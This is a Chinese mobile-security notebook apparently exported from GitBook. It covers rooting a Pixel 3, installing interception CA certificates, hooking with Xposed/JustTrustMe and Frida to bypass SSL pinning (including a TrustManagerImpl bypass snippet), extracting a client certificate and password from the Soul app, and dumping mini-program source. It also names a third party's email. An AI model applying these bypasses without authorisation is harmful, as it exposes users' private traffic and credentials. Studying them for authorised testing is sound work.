\"解锁BL\"通常是指解锁Android设备的Bootloader（引导程序）。Bootloader是Android设备的一部分，它是负责启动Android操作系统的程序。当设备的Bootloader被锁定时，用户将无法在设备上安装自定义操作系统或修改系统文件等。因此，解锁Bootloader可以让用户获得更高的设备控制权和更广泛的自定义选项，但也可能导致设备的保修失效或安全风险增加。 要确定Android设备的Bootloader（引导程序）是否已解锁，可以按照以下步骤操作： 打开设备并进入“开发者选项”。如果你不知道如何打开开发者选项，请前往设备设置，然后找到“关于手机”或“关于平板电脑”，在其中找到“版本号”并连续点击7次，直到提示你已进入开发者选项。 进入开发者选项后，在其中找到“OEM解锁”或“解锁引导程序”等选项，如果它是开启的，那么设备的Bootloader已经解锁。 开始刷机 先升级一下本地的ADB brew upgrade android-platform-tools --cask 镜像下载地址：https://developers.google.cn/android/images?hl=zh-cn 小版本选QP1A.190711.020 点击“Link”开始下载，下载好后解压，大概长这个样 再解压image-blueline-qp1a.190711.020.zip这个压缩包 然后去GitHub下载专门拖壳镜像，主页选择自己合适的版本，我是pixel 3，就选blueline。 这里因为刷主页原来的ROM，magisk一直有问题，所以找了一个偏方 解压新下载的，然后替换覆盖 替换后把image-blueline-qp1a.190711.020压缩回去 zip -r image-blueline-qp1a.190711.020.zip * 运行 adb reboot bootloader fastboot flashing unlock # 按下音量键，选择unlock adb reboot fastboot bash flash-all.sh 运行完出现Finished.就说明OK了，手机也会启动，到这刷机就OK了 安装管理界面 MikManager是一个rom逆向工具的管理界面。该软件用于对接MikRom来实现rom层面的逆向工具。仅仅提供界面化操作管理，并将用户需求保存为json数据，由MikRom解析后进行相应的执行，并导出结果到对应的目录。 wget https://github.com/dqzg12300/MikManager/releases/download/v1.0.1/mikmanager.apk adb install -t mikmanager.apk ROM相关教程 参考GitHub 脱壳 每次脱壳前记得删除原脱壳保留的dump目录 正常脱壳，打开APP后会等待60秒才开始脱壳 如果脱壳失败，或者脱壳太慢，可以选择白名单进行脱壳，出现xxx_repair.dex就说明是脱完了 frida hook pip3 install frida==15.1.11 pip3 install frida-tools==10.0.0 其他 安装Magisk 参考：https://blog.isteed.cc/post/pixel-3-install-magisk/ 先安装好Magisk apk adb install Magisk-v25.2.apk 然后在刚才刷机ROM替换的文件中找到boot.img 传送boot.img文件到手机上 adb push boot.img /sdcard/Download/ 再用Magisk修补这个文件 Magisk Manager - 安装 - 选择并修补一个文件 - 选择传到手机上的boot.img文件 - 开始 修补后拷贝到电脑上（如果拷贝到一半总断开，然后连不上设备，大概率是USB电源供电不足的问题，可以采用其他办法如通过ES文件浏览器开一个FTP来下载） adb pull /sdcard/Download/magisk_patched-25200_5RDnr.img ./ 进入fastboot模式 adb reboot bootloader 运行修补的img fastboot boot magisk_patched-25200_5RDnr.img 然后会开机，拥有临时的 Magisk ，打开Magisk，选择安装，选择”直接安装“即可。 最后重启就OK了 [!NOTE] 如果提示“检测到不属于Magisk的su文件”可以不管，不影响使用，这是因为ROM中自带了一个su。 本来想解决的，尝试用adb disable-verity再挂载也不行，放弃了，等到后期不得不改再想办法吧。 安装系统证书 [!DANGER] 正常情况下，在Android7上通过《root后导入根证书》就可以安装系统证书，但是这个ROM不行，尝试了disable-verity、remount等等都不行，查了好久的资料，最后还是通过magisk来成功安装证书。 在Magisk官方介绍中，可见magisk模块保存在/data/adb/modules里 且模块中的system目录下的内容会递归合并到真实的system目录下 所以我们直接将证书放到这个目录下就可以了，操作如下： # 计算证书hash openssl x509 -inform der -subject_hash_old -in cacert.der -noout # 重命名为.0 mv cacert.der 9a5ba575.0 # 在magisk模块目录下创建对应的文件夹 adb root adb shell \"mkdir -p /data/adb/modules/hosts/system/etc/security/cacerts\" # 推送证书到对应的目录 adb push 9a5ba575.0 /data/adb/modules/hosts/system/etc/security/cacerts/ 安装后在Magisk的模块应该就能看到了，重启后系统里面也会添加上对应的证书。 安装EdXposed [!TIP] *posed系列的东西不是很有必要，主要还是装了有解决不了的BUG，模块会提示“此模块因被安装在SD卡中而导致无法加载，请将其移动到内部存储” 参考GitHub: https://github.com/ElderDrivers/EdXposed/wiki/%E7%AE%80%E4%BB%8B 先下载 Riru、EdXposed 注意：Riru要下载v25.4.4的，不然会有BUG，参考issue adb push riru-v25.4.4-release.zip /sdcard/Download/ adb push EdXposed-v0.5.2.2_4683-master-release.zip /sdcard/Download/ 在Magisk管理端中从本地安装模块，先安装Riru，再安装EdXposed，最后重启，重启后在Magisk里面就可以看到刚才安装的模块了。 然后下载EdXposedManager并安装 adb install EdXposedManager-4.6.2-46200-org.meowcat.edxposed.manager-release.apk 在面具中安装好对应的Riru版本，以及Riru-EdXposed模块之后 在对应的EdXposed 仲可以看到框架已被激活 但是当我们安装如JustTrustMe模块，会显示此模块因被安装在SD卡中而导致无法加载，请将其移动到内部存储中，试过搜索引擎提供的所有方法，包括ChatGPT，都告知需要将其存储更改为内部存储，但是该机器是无外置内存卡，只有一种可能就是在分区的时候给划分区域弄错了，但是可以不使用xposed框架吗，答案是可以的，但是每次都需要去hook SSL，不易持久化，所以尽量还是想想解决办法 最后在设置中，将关闭状态勾选上，重启EdXposed就可以使用模块了（一定要重启EdXposed app） 当勾选上JustTrustMe之后，重启手机即可使用 为什么我一定要用这个？ 因为持久化会比较方便 其次为了解决一些简单的app的双向认证（frida也可以，但是每次都要动手操作，很麻烦），以及浏览器不信任证书的问题（主要是浏览器不信任burp、charles证书的问题） 不想再折腾了，搞这个rom以及配置所有的环境遇到了各种各样的问题，最后得出结论，让其保持相对稳定即可 安装LSPosed 先下载Riru、LSPosed adb push riru-v26.1.7.r530.ab3086ec9f-release.zip /sdcard/Download/ adb push LSPosed-v1.8.6-6712-riru-release.zip /sdcard/Download/ 在Magisk管理端中从本地安装模块，先安装Riru，再安装LSPosed，最后重启，重启后在Magisk里面就可以看到刚才安装的模块了。 在消息提示栏中就可以看到LSPosed的管理界面了。 模块推荐 Magisk: https://github.com/Magisk-Modules-Repo EdXposed | LSPosed: https://github.com/Xposed-Modules-Repo https://modules.lsposed.org/ 时间校准的问题 在“设置 -> 系统 -> 时间”处，时区选择中国上海，也就是GMT+08:00 adb shell settings put global ntp_server ntp1.aliyun.com adb reboot 手机投屏到PC 安装scrcpy进行屏幕镜像，安装过程记得挂代理，不然会很慢很慢，而且会经常失败。 brew install scrcpy 使用 scrcpy -h scrcpy 可以在电脑上直接操作手机 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 16:18:36 "},"知识库/05.移动安全/04.HTTP单向验证-双向验证解释.html":{"url":"知识库/05.移动安全/04.HTTP单向验证-双向验证解释.html","title":"04.HTTP单向验证-双向验证解释","keywords":"","body":"HTTP简介 HTTP（HyperText Transfer Protocol，超文本传输协议）被用于在Web浏览器和网站服务器之间传递信息，在TCP/IP中处于应用层。这里提一下TCP/IP的分层共分为四层：应用层、传输层、网络层、数据链路层; 分层的目的是：分层能够解耦，动态替换层内协议 各个层包含的内容： 应用层：向用户提供应用服务时的通讯活动（ftp，dns，http） 传输层：网络连接中两台计算机的数据传输（tcp、udp） 网络层：处理网络上流动的数据包，通过怎样的传输路径把数据包传送给对方（ip） 数据链路层：与硬件相关的网卡、设备驱动等等 然而HTTP也有以下明显缺点： 通信使用明文，内容可能被窃听 不验证通信方的身份，因此有可能遭遇伪装 无法证明报文的完整性，所以有可能遭到篡改 这样，HTTPS就登场了。HTTPS中的S表示SSL或者TLS，就是在原HTTP的基础上加上一层用于数据加密、解密、身份认证的安全层，即 HTTP + 加密 + 认证 + 完整性保护 = HTTPS 加密相关的预备知识：对称加密和非对称加密。 对称加密 ： 加密和解密数据使用同一个密钥。这种加密方式的特点是速度很快，常见对称加密的算法有 AES； 非对称加密： 加密和解密使用不同的密钥，这两个密钥形成有且仅有唯一的配对，叫公钥和私钥。数据用公钥加密后必须用私钥解密，数据用私钥加密后必须用公钥解密。一般来说私钥自己保留好，把公钥公开给别人（一般公钥不会单独出现，而是会写进证书中），让别人拿自己的公钥加密数据后发给自己，这样只有自己才能解密。 这种加密方式的特点是速度慢，CPU 开销大，常见非对称加密算法有 RSA。 CA证书的相关知识： CA证书是由CA（Certification Authority）机构发布的数字证书。其内容包含：电子签证机关的信息、公钥用户信息、公钥、签名和有效期。这里的公钥服务端的公钥，这里的签名是指：用hash散列函数计算公开的明文信息的信息摘要，然后采用CA的私钥对信息摘要进行加密，加密完的密文就是签名。 即：证书 = 公钥 + 签名 +申请者和颁发者的信息。 客户端中因为在操作系统中就预置了CA的公钥，所以支持解密签名（因为签名使用CA的私钥加密的） 有了这些预备知识后，就可以来看看HTTPS是如何怎么做到安全认证的。 HTTPS单向认证 从上图可以看出，服务端拥有一对非对称密钥：B公钥和B私钥。详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端生成一个随机数（密钥F），用刚才等到的服务端B公钥去加密这个随机数形成密文，发送给服务端。 （5）服务端用自己的B私钥去解密这个密文，得到了密钥F （6)服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS双向认证 双向认证和单向认证原理基本差不多，单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证 双向认证详细过程如下： （1）客户端发起HTTPS请求，将SSL协议版本的信息发送给服务端。 （2）服务端去CA机构申请来一份CA证书，在前面提过，证书里面有服务端公钥和签名。将CA证书发送给客户端 （3）客户端读取CA证书的明文信息，采用相同的hash散列函数计算得到信息摘要（hash目的：验证防止内容被修改），然后用操作系统带的CA的公钥去解密签名（因为签名是用CA的私钥加密的），对比证书中的信息摘要。如果一致，则证明证书是可信的，然后取出了服务端公钥 （4）客户端发送自己的客户端证书给服务端，证书里面有客户端的公钥：C公钥 （5）客户端发送支持的对称加密方案给服务端，供其选择 （6）服务端选择完加密方案后，用刚才得到的C公钥去加密选好的加密方案 （7）客户端用自己的C私钥去解密选好的加密方案，客户端生成一个随机数（密钥F），用刚才等到的服务端B公钥去加密这个随机数形成密文，发送给服务端。 （8)服务端和客户端在后续通讯过程中就使用这个密钥F进行通信了。和之前的非对称加密不同，这里开始就是一种对称加密的方式 HTTPS基本思路总结 HTTPS在保证数据安全传输上使用对称加密和非对称加密相结合的方式来进行的，简单来说就是通过一次非对称加密算法进行了最终通信密钥的生成、确认和交换，然后在后续的通信过程中使用最终通信密钥进行对称加密通信。之所以不是全程非对称加密，是因为非对称加密的计算量大，影响通信效率。 抓包原理 常用的HTTPS抓包方式是作为中间人，对客户端伪装成服务端，对服务端伪装成客户端。简单来说： 截获客户端的HTTPS请求，伪装成中间人客户端去向服务端发送HTTPS请求 接受服务端返回，用自己的证书伪装成中间人服务端向客户端发送数据内容。 具体过程如下图所示： 反抓包策略 为了防止中间人攻击，可以使用SSL-Pinning的技术来反抓包。 可以发现中间人攻击的要点的伪造了一个假的服务端证书给了客户端，客户端误以为真。解决思路就是，客户端也预置一份服务端的证书，比较一下就知道真假了。 SSL-pinning有两种方式： 证书锁定（Certificate Pinning） 和公钥锁定（ Public Key Pinning）。 证书锁定 需要在客户端代码内置仅接受指定域名的证书，而不接受操作系统或浏览器内置的CA根证书对应的任何证书，通过这种授权方式，保障了APP与服务端通信的唯一性和安全性，因此客户端与服务端（例如API网关）之间的通信是可以保证绝对安全。但是CA签发证书都存在有效期问题，缺点是在 证书续期后需要将证书重新内置到APP中。 公钥锁定 提取证书中的公钥并内置到客户端中，通过与服务器对比公钥值来验证连接的正确性。制作证书密钥时，公钥在证书的续期前后都可以保持不变（即密钥对不变），所以可以避免证书有效期问题，一般推荐这种做法。突破SSL-Pinning抓包 思路是这样的：内置证书或者公钥的时候，常常会有对比验证的函数，直接控制这个函数的返回结果让验证通过不就好了吗。 于是就有了一个突破SLL-Pinning的经典操作：采用Xposed+justTrustme模块。 这个方案使用的是JustTrustMe这个Xposed模块，它所做的事情就是将各种已知的的HTTP请求库中用于校验证书的API都进行Hook，使无论是否是可信证书的情况，校验结果返回都为正常状态，从而实现绕过证书检查的效果。 突破证书双向验证抓包 参考安卓ROOT抓包及绕过SSLPinning 总结 单向认证客户端需要认证服务端，而在双向认证中增加了服务端对客户端的认证。 https抓不到包可能是使用了SSL Pinning或者证书双向验证来防止的。 HTTPS抓不到包的情况下，进行以下尝试 判断是不是SSL Pinning的技术来反抓包（直接用Xposed+justTrustme模块看看能不能抓包） 突破证书双向验证进行抓包 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 16:13:17 "},"知识库/05.移动安全/05.低版本安卓安装好apk无法打开情况分析.html":{"url":"知识库/05.移动安全/05.低版本安卓安装好apk无法打开情况分析.html","title":"05.低版本安卓安装好apk无法打开情况分析","keywords":"","body":"背景 今天在做安卓的项目的时候，发现安装好的apk不管在测试机还是模拟器中都无法打开，并且提示此应用未安装 在进行安装的时候，使用adb install 以及下载远程apk文件进行安装都报此错 报错详情 使用logcat 抓取app在运行态中的日志，发现如下报错 首先可以看到运行app的时候提示是没有权限，进而分析，通过aapt获取AndroidManifest.xml在mainActivity中可以看到设置的exported为0x0，这里就很奇怪了，mainActivity是app入口，如果属性exported为false则不能被android调用，则不能正常启动程序 然后再反编译查看AndroidManifest.xml，可以看到android.exported确实是为false。。。 log的意思是说不能app的进程不能被其他进程(这里指的是com.android.launcher，即手机的launcher应用)调用。解决方法就是在MainActivity的属性中添加exported=\"true\" 参考链接 https://blog.csdn.net/u013270444/article/details/52860854 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 16:13:28 "},"知识库/05.移动安全/06.获取微信小程序源码.html":{"url":"知识库/05.移动安全/06.获取微信小程序源码.html","title":"06.获取微信小程序源码","keywords":"","body":"获取微信小程序的源码 方法一：直接抓包法 小程序一般会先向微信服务器上下载小程序的资源，所以抓包一定情况下可以看到 新版的微信小程序采用了zstd压缩，所以下载后需要先解压，老版本没压缩可以直接下载源码，这是一个需要注意的地方 前提 手机上无该小程序的缓存文件，如果有，进行如下操作 操作步骤 1、使用fiddler抓包，获取小程序资源下载链接 PS：burp也可以，只是感觉fiddler抓手机包更快 2、下载小程序 3、zstd解压 zstd -d xxx.zstd 4、解压后添加后缀.wxapkg，然后进行反编译，此处以wxappUnpacker为例 结果 反编译后的目录结果 反编译后的内容 方法二：本地缓存文件读取法 网上基本都用的这个办法，感觉不如上面那个好用，还麻烦！！！ 这是2019年记录的，可能现在存在一些误差，有问题及时联系我 前提 手机root 手机已经访问过小程序，在系统中存在缓存 安装RE文件管理器 操作步骤 1、首先访问如下目录/data/data/com.tencent.mm/MicroMsg/，找到wxapkg文件 2、拖到电脑（此处我用的adb，也可以使用模拟器的共享文件夹等） ## adb命令 adb pull /data/data/com.tencent.mm/MicroMsg/d32f736510b7c9582b5fc1aa3673b2bb/appbrand/pkg/debug_826840826_2_-1071461312 3、使用WxApkgUnpacker.exe反编译wxapkg获取源文件 结果 其他 有些工具下载地址挂了，可以多在github上找找，这里提供一些本地下载吧 WxApkgUnpacker.exe wxappUnpacker-master.zip mp-unpack.Setup.1.1.1.exe mp-unpack-1.1.1.dmg 微信开发者工具调试 可选步骤，一般不需要 下载地址：https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html 调试过程 下载安装后打开，导入反编译的源码 点击编译（不编译看着也比较舒服吧哈哈） 编译完成后就可以自己调试了 如果代码存在混淆等情况，可能编译不成功，不过也不太影响我们测试，因为我们也主要是分析各个接口的东西；如果有加密什么的，能调试就很方便 放一张别人编译成功的图吧 参考 小程序渗透测试-前端打包调试解密 获取支付宝小程序的源码 和微信小程序差不多，只是路径不一样，支付宝小程序的路径为 /data/data/com.eg.android.AlipayGphone/files/nebulaInstallApps 另外具体目录名为小程序tinyAppId值，其中的tar包即为源码文件。tar包未加密，adb pull出来之后直接解压即可 JS美化 源码基本都是前后端分离的前端，所以基本都是js、html什么的，直接看比较费眼睛，结合一下效果挺好。 用微信开发者工具调试，会自动高亮，不过混淆的也不好看 搜索引擎搜索 js在线美化 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-12 14:37:07 "},"知识库/05.移动安全/07.证书双向验证抓包.html":{"url":"知识库/05.移动安全/07.证书双向验证抓包.html","title":"07.证书双向验证抓包","keywords":"","body":"证书双向验证抓包 此处以soal app为例 首先需要下载soul app，然后安装 先尝试一下是不是单向验证+SSL pinning来防止抓包的 方法一：Xposed加载JustTrustMe模块 方法二：使用frida的ssl_pinning的js模块 frida -U -l ssl_unpinning.js -f cn.soulapp.android # 注意 -f 后面接的是 package name，从设备中读取的 打开soul app，抓包 提示 400 No required SSL certificate was sent，说明是证书双向验证的 双向验证抓包开始 直接解压apk 找一下证书 如果服务器端会对客户端证书进行校验, 证书应该就直接存放在apk里 证书一般放到目录 /asset 或者 /res/raw 目录下的，如果没找到，可以用 find 找一下后缀为 .cer .p12 .pfx 的文件 这里找到证书为 client.p12 找一下证书密码 在我们要使用该证书的时候, 需要输入安装证书的密码。 找到p12证书的话，可以通过这个证书+密码转换成本机安装的证书格式，比如cer。 反编译分析啥的太麻烦了，不太会，所以还是用frida吧 frida -U -l tracer_keystore.js -f cn.soulapp.android 本地安装并信任证书 burp添加p12证书 打开Burp --> User Options-->Client SSL Certificates --> Add -->Host设置前面返回400的地址，证书类型选 PKCS#12 选择刚才看到的p12证书，然后输入frida提取到的密码。 验证 再次抓包，可见能成功抓取到https的包。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-27 16:13:43 "},"知识库/05.移动安全/08.Xserver.html":{"url":"知识库/05.移动安全/08.Xserver.html","title":"08.Xserver","keywords":"","body":"Xserver 下载地址 xserver Hook adb端口转发 如果转发了8000端口本地还访问不到，那可能因为某些原因它初始化的时候没有在8000上，所以这个时候需要通过找PID的值进行转发。 adb forward tcp:8000 tcp:8000 选择一个app 打开app 打开本地127.0.0.1:8000，即可成功hook的web界面了 使用 模拟器设置好burp代理，打开测试的app 主要介绍两个功能，一个是trace，访问地址是http://localhost:8000/tracer 一个是hook，访问地址是http://localhost:8000/invoke 加载所有方法 可以看到加载了136759个方法。 输入规则过滤，并且hook 这个靠猜，比如decode、decrypt、AES、DES等 hook后运行app，发起网络请求 可以看到明文数据，说明找到了对应的解密方式 点击decrypt方法 进入后，在框内输入加密后的内容，点击invoke即可解密，可以在burp中看到过程 burp中看到的数据，后面app操作中所有解密的地方burp都能看到 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 14:51:11 "},"知识库/05.移动安全/09.详解android抓包.html":{"url":"知识库/05.移动安全/09.详解android抓包.html","title":"09.详解android抓包","keywords":"","body":"简介 由于手机银行app项目的原因，需要详细了解一下 SSL Pinning 和 双向认证的全过程，所以需要对android 抓包做一个详细的总结，这里我将自己手撸一个android app，且申请受信任的服务器证书（非自签名证书）来对SSL 进行详细的总结 key Value Android 版本 Android 10 Android 手机型号 Pixel3 证书机构 Let's Encrypt Android SDK SDK 34 SSL/TLS中间人攻击 HTTPS https是基于http协议和TCP之间添加一个TLS/SSL层来加密传输的数据，以确保传输过程中的隐私和安全。 BurpSuite 抓包过程 BurpSuite不光是一个代理的功能，它还是一个自签名的私有CA，当Client请求SSL站点时，burpsuite会返回PortSwigger CA颁发的伪造的证书给Client，Client前期由于导入了信任CA的根证书，因此就信任了这个伪造的证书，从而实现了Client与burp之间的SSL加密通信。然后，BrupSuite再与真实web Server 进行正常https通讯，把client的请求直接转发给服务器，从而实现burpsuite和Web Server之前的SSL加密通信。在中间形成一个基于https的代理，从而获取client与Web Server之间通信的解密报文 APP抓包 在PC上可以将BurpSuite（此类抓包工具）的自签名CA证书导入到受信任的根证书CA中，所以我们在PC上抓包就可以直接SSL的包，其实根据上图中可以看到BurpSuite其实是利用客户端默认信任自签名的CA证书，所以在抓包过程中做了一层SSL加解密处理，所以才能抓到request明文包，然后再用自己的身份和Server 通信，转发Client的包，用Server的证书来加解密，所以我们能看到response明文包，当理解了之后再来看android抓包 在这里我先使用nodejs 快速搭建了一个Web服务器 const express = require('express') const https = require('https') const fs = require('fs') const app = new express() var index = 0 var options = { key: fs.readFileSync('./privkey.pem'), cert: fs.readFileSync('./fullchain.pem') } const httpsServer = https.createServer(options, app) app.get('/', (req, res) => { res.send('its working') }) app.post('/testPost', (req, res) => { index++ res.send('post working\\t' + index) }) httpsServer.listen(8088, () => { console.log('https running!') }) 在这里我新建了一个app项目 // MainActivity package com.example.myapplication; import android.os.Bundle; import androidx.appcompat.app.AppCompatActivity; import android.view.Menu; import android.view.View; import android.widget.Button; import android.widget.Toast; import com.google.android.material.snackbar.Snackbar; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Button myButton = findViewById(R.id.myTestButton); myButton.setOnClickListener(v -> { try{ MyAsyncTask myAsyncTask = new MyAsyncTask(MainActivity.this); User user = new User(); user.setUsername(\"aaron\"); user.setPassword(\"123456\"); String news = String.valueOf(myAsyncTask.execute(\"https://www.bk3.info:8088/testPost\",user.toString())); if(news != null){ Toast.makeText(MainActivity.this, news, Toast.LENGTH_SHORT).show(); } System.out.println(news); }catch (Exception e){ e.printStackTrace(); } }); } @Override public boolean onCreateOptionsMenu(Menu menu) { // Inflate the menu; this adds items to the action bar if it is present. getMenuInflater().inflate(R.menu.menu_main, menu); return true; } } // MyAsyncTask package com.example.myapplication; import android.app.Activity; import android.content.Context; import android.os.AsyncTask; import android.widget.Button; import android.widget.TextView; import android.view.View; import java.io.BufferedReader; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.io.DataOutputStream; import java.net.URL; public class MyAsyncTask extends AsyncTask{ private Context mContext; public MyAsyncTask(Context mContext){ this.mContext = mContext; } @Override protected String doInBackground(String...params) { String result = \"\"; try { URL url = new URL(params[0]); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); connection.setRequestMethod(\"POST\"); connection.setDoOutput(true); DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream()); String postData = params[1]; // 替换为你的POST参数 outputStream.writeBytes(postData); outputStream.flush(); outputStream.close(); BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream())); String line; while ((line = reader.readLine()) != null) { result += line; } reader.close(); connection.disconnect(); } catch (Exception e) { e.printStackTrace(); } System.out.println(result); return result; } @Override protected void onPostExecute(String result) { TextView textView = ((Activity)mContext).findViewById(R.id.MainTextView); textView.setText(result); } } 具体功能表现为点击按钮，将response显示在TextView上 当将BurpSuite的CA证书导入到系统证书目录下，抓包的时候发现Burp无法抓包 且用frida hook的时候会显示使用了SSL Pinning（TrustManagerImpl） Frida 脚本的关键代码如下 var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl'); TrustManagerImpl.verifyChain.implementation = function (untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) { console.log('[+] Bypassing TrustManagerImpl (Android > 7): ' + host); return untrustedChain; }; [!INFO] 我并没有添加SSL Pinning 专门来校验服务端的证书，但是直接抓包不成功，且在使用frida hook SSL Pinning 之后会发现存在TrustManagerImpl.verifyChain(untrustedChain, trustAnchorChain, host, clientAuth, ocspData, tlsSctData)这个函数的调用 证书问题 此时，我还未发现是证书问题，还以为是我在开发打包过程中莫名其妙添加了一些认证框架进来，当我询问Android开发大佬yksqn35919@gmail.com，他告诉我如果是使用了框架去看看依赖，如果存在的话，按照安卓网络安全配置将系统证书添加进去，我尝试过，还是不行 最后我想起我PC的Charles的证书已经过期了，且我重新申请之后，又需要将新证书导入到信任的系统证书中，这样我的PC才能抓到包 这时我手机里的BurpSuite证书还是@屈大佬的BurpSuite的CA证书（且未过期） 当我使用openssl重新计算CA证书，并重新添加到Android的系统证书中，发现可以抓包了 且Frida hook 不会有 Kill SSL Pinning 的操作 所以到这里可以看到其实是证书的问题 然后捋清楚了SSL/TLS的中间人攻击，我通过WireShark抓包查看SSL 握手包 终于发现了问题 由于我重新生成了BurpSuite的CA证书，但是我一直以为 openssl x509 -inform DER -subject_hash_old -in xxx.der 算出来的hash 是一样的，所以我没有更新我android手机里系统里的burp CA证书，导致app 与 burp 通信的时候，证书不被信任，就抓不到包，且使用frida去hook时发现存在ssl pinning，是因为新生成的证书和以前的证书签名没过，所以frida 其实hook到的是app 与 burp 通信的时候证书校验 # 生成android证书的正确步骤 # .cer格式证书 openssl x509 -inform DER -subject_hash_old -in 证书文件.cer # .pem格式证书 openssl x509 -inform PEM -subject_hash_old -in 证书文件.pem # cer格式 openssl x509 -inform DER -text -in xxx.cer > 43340bc0.0 # pem格式 openssl x509 -inform PEM -text -in xxx.pem > 43340bc0.0 最后编辑一下输出的文件，把 -----BEGIN CERTIFICATE----- 到最后的这部分移动到开头。结果如下 通过WireShark可以看到，首先是和BurpSuite建立连接，然后有SSL/TLS握手的包（但是这个包我之前抓到过，但是现在与BurpSuite建立长连接之后抓不到了）就将就看与BurpSuite的HTTPS的连接 可以看到第二个图中在建立连接之后，明显包的数量比第一个图的数量多，就可以推导在SSL/TLS握手之后成功之后就会有下一步操作（中间人攻击，burp拿到数据之后再发送给app） 我们可以看一下SSL/TLS握手的数据包（这个是在android中使用tcpdump抓取到的SSL/TLS握手）这里我就将我的域名指向了我公网的老毛子服务器，流程如下： 客户端向服务器发送Client Hello,告诉服务器，我支持的协议版本，加密套件等信息。 服务器收到响应，选择双方都支持的协议，套件，向客户端发送Server Hello。同时服务器也将自己的证书发送到客户端(Certificate)。 客户端自己生产预主密钥，通过公钥加密预主秘钥，将加密后的预主秘钥发送给服务器 (Client Exchange)。 服务器用自己的私钥解密加密的预主密钥。 之后，客户端与服务器用相同的算法根据客户端随机数，服务器随机数，预主秘钥生产主密钥，之后的通信将都用主密钥加密解密。 在了解了SSL/TLS握手的全过程之后，那么可以推导出以下结论： 在只有SSL/TLS中，只要BurpSuite的证书被信任，那么就一定是可以抓包 如果BurpSuite的证书没有被信任，那么只要可以Hook到app与burpsuite的SSL/TLS握手，让其信任burpsuite的CA就可以抓包 root过的机器，可以使用Xposed+JustTrustMe或frida hook ssl无视app与burpsuite的证书信任问题 非root的机器，可以使用VirtualXposed+JustTrustMe无视app与burpsuite的证书问题 如果存在受信任的CA证书和私钥，可以将其导入到BurpSuite中，无视app与BurpSuite的证书信任问题 SSL Pinning（校验服务端证书） 在build.gradle中引入okhttp框架 plugins { id(\"com.android.application\") } android { namespace = \"com.example.myapplication\" compileSdk = 34 defaultConfig { applicationId = \"com.example.myapplication\" minSdk = 29 targetSdk = 33 versionCode = 1 versionName = \"1.0\" testInstrumentationRunner = \"androidx.test.runner.AndroidJUnitRunner\" } buildTypes { release { isMinifyEnabled = false proguardFiles( getDefaultProguardFile(\"proguard-android-optimize.txt\"), \"proguard-rules.pro\" ) } } compileOptions { sourceCompatibility = JavaVersion.VERSION_1_8 targetCompatibility = JavaVersion.VERSION_1_8 } buildFeatures { viewBinding = true } } dependencies { implementation(\"androidx.appcompat:appcompat:1.6.1\") implementation(\"com.google.android.material:material:1.10.0\") implementation(\"androidx.constraintlayout:constraintlayout:2.1.4\") implementation(\"androidx.navigation:navigation-fragment:2.7.5\") implementation(\"androidx.navigation:navigation-ui:2.7.5\") testImplementation(\"junit:junit:4.13.2\") androidTestImplementation(\"androidx.test.ext:junit:1.1.5\") androidTestImplementation(\"androidx.test.espresso:espresso-core:3.5.1\") // 引入oklhttp框架 implementation(\"com.squareup.okhttp3:okhttp:4.9.1\") } 创建OkHttpAsyncTask继承AsyncTask如下所示： package com.example.myapplication; import android.app.Activity; import android.content.Context; import android.os.AsyncTask; import android.widget.TextView; import java.io.InputStream; import java.security.cert.Certificate; import java.security.cert.CertificateFactory; import java.security.KeyStore; import javax.net.ssl.SSLContext; import javax.net.ssl.TrustManagerFactory; import javax.net.ssl.X509TrustManager; import okhttp3.*; public class OkHttpAsyncTask extends AsyncTask { private Context mContext; public OkHttpAsyncTask(Context mContext){ this.mContext = mContext; } @Override protected String doInBackground(String... params) { OkHttpClient client = getOkHttpClient(); RequestBody formBody = new FormBody.Builder().add(\"username\",params[1]).add(\"password\",params[2]).build(); Request request = new Request.Builder() .url(params[0]) // 使用一个示例API .post(formBody) .build(); try{ Response response = client.newCall(request).execute(); if (response.isSuccessful()) { return response.body().string(); } else { return \"Error: \" + response.code() + \" \" + response.message(); } }catch (Exception e){ e.printStackTrace(); return \"Error: \" + e.getMessage(); } } @Override protected void onPostExecute(String result) { TextView textView = ((Activity)mContext).findViewById(R.id.MainTextView); textView.setText(result); } // 添加SSL Pinning 代码 并且添加服务器证书（也就是验证服务端证书） private OkHttpClient getOkHttpClient(){ try{ // 从res/raw目录中读取证书 InputStream inputStream = ((Activity)mContext).getResources().openRawResource(R.raw.fullchain); // 创建 Certificate 对象 CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\"); Certificate certificate = certificateFactory.generateCertificate(inputStream); // 创建 KeyStore 并将证书添加进去 KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(null, null); keyStore.setCertificateEntry(\"certificate\", certificate); // 创建TrustManagerFactory，并将KeyStore初始化到TrustManagerFactory中 TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance( TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore); // 创建SSLContext，使用TrustManagerFactory初始化 SSLContext sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(null, 